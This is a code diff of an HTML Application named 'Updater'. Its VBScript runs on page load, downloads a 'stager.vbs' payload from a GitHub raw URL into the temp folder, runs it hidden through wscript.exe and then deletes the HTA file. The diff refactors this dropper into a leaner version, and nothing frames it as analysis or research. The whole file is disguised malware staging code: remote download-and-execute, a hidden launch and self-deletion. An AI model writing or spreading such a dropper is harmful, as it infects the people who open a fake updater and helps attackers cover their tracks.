@@ -10,87 +10,57 @@
   />
   <title>Updater</title>
   <script language="VBScript">
-    Sub Window_OnLoad()
-      Const DEBUG_LOG = "%TEMP%\hta_refactor_debug.txt"
-      Dim sh, fso, tempVbs, htaPath
-      Dim http, ts, url, logFile, wshPath, proc, start
+    ' This will run as soon as the body fires the onload event
+    Sub window_onload()
+      Const LOG_PATH = "%TEMP%\hta_debug_simple.txt"
+      Dim sh, fso, tempVbs, url, http, ts, wshPath
 
-      ' — Initialize logging —
-      Set fso = CreateObject("Scripting.FileSystemObject")
+      ' — Initialize —
       Set sh  = CreateObject("WScript.Shell")
-      log(DEBUG_LOG, "=== HTA Refactor Start ===")
+      Set fso = CreateObject("Scripting.FileSystemObject")
+      log LOG_PATH, "HTA starting"
 
-      ' Prepare paths
-      tempVbs = sh.ExpandEnvironmentStrings("%TEMP%") & "\stager.vbs"
-      url      = "https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs"
-      wshPath  = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\wscript.exe")
+      tempVbs  = sh.ExpandEnvironmentStrings("%TEMP%\stager.vbs")
+      url       = "https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs"
+      wshPath   = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\wscript.exe")
 
-      ' — Download via WinHttpRequest —
-      log DEBUG_LOG, "Creating WinHttpRequest"
-      On Error Resume Next
+      ' — Download with WinHttpRequest —
+      log LOG_PATH, "Creating WinHttpRequest"
       Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-      If Err.Number <> 0 Then
-        log DEBUG_LOG, "ERROR creating WinHttpRequest: " & Err.Description
-        Exit Sub
-      End If
-      On Error GoTo 0
-
-      log DEBUG_LOG, "Fetching " & url
       http.Open "GET", url, False
       http.Send
 
       If http.Status = 200 Then
-        log DEBUG_LOG, "Download succeeded, writing to " & tempVbs
+        log LOG_PATH, "Download succeeded, writing stager.vbs"
         Set ts = fso.CreateTextFile(tempVbs, True, False)
         ts.Write http.ResponseText
         ts.Close
+
+        ' — Execute it —
+        log LOG_PATH, "Launching stager.vbs via wscript.exe"
+        sh.Run """" & wshPath & """ """ & tempVbs & """", 0, False
       Else
-        log DEBUG_LOG, "Download failed: HTTP " & http.Status
-        Exit Sub
+        log LOG_PATH, "Download failed, HTTP " & http.Status
       End If
 
-      ' — Execute the VBS stub and wait for it to start —
-      log DEBUG_LOG, "Launching stager.vbs via wscript.exe"
-      ' Wait = True so HTA blocks until wscript starts
-      sh.Run """" & wshPath & """ """ & tempVbs & """", 0, True
-
-      ' — Poll for the stager’s own debug log —
-      start = Timer
-      Do
-        If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%\stager_debug.txt")) Then
-          log DEBUG_LOG, "Detected stager_debug.txt, stub launched!"
-          Exit Do
-        End If
-        ' timeout after 10s
-        If Timer - start > 10 Then
-          log DEBUG_LOG, "Timed out waiting for stager_debug.txt"
-          Exit Do
-        End If
-        WScript.Sleep 500
-      Loop
-
-      ' — Cleanup HTA —
-      htaPath = document.location.pathname
-      If fso.FileExists(htaPath) Then
-        log DEBUG_LOG, "Deleting HTA: " & htaPath
-        fso.DeleteFile htaPath, True
-      End If
-
-      log DEBUG_LOG, "=== HTA Refactor End ==="
+      ' — Clean up this HTA and exit —
+      fso.DeleteFile document.location.pathname, True
+      log LOG_PATH, "HTA done"
       self.close
     End Sub
 
+    ' Helper to append to a log file
     Sub log(path, msg)
-      Dim lf, shell
-      Set shell = CreateObject("WScript.Shell")
-      Dim p : p = shell.ExpandEnvironmentStrings(path)
+      Dim lf, p
+      p = CreateObject("WScript.Shell").ExpandEnvironmentStrings(path)
       Set lf = CreateObject("Scripting.FileSystemObject") _
                  .OpenTextFile(p, 8, True)
-      lf.WriteLine Now() & " - " & msg
+      lf.WriteLine Now() & " – " & msg
       lf.Close
     End Sub
   </script>
 </head>
-<body>
+<!-- Attach our VBScript entry point to the body’s onload event -->
+<body onload="window_onload">
 </body>
 </html>
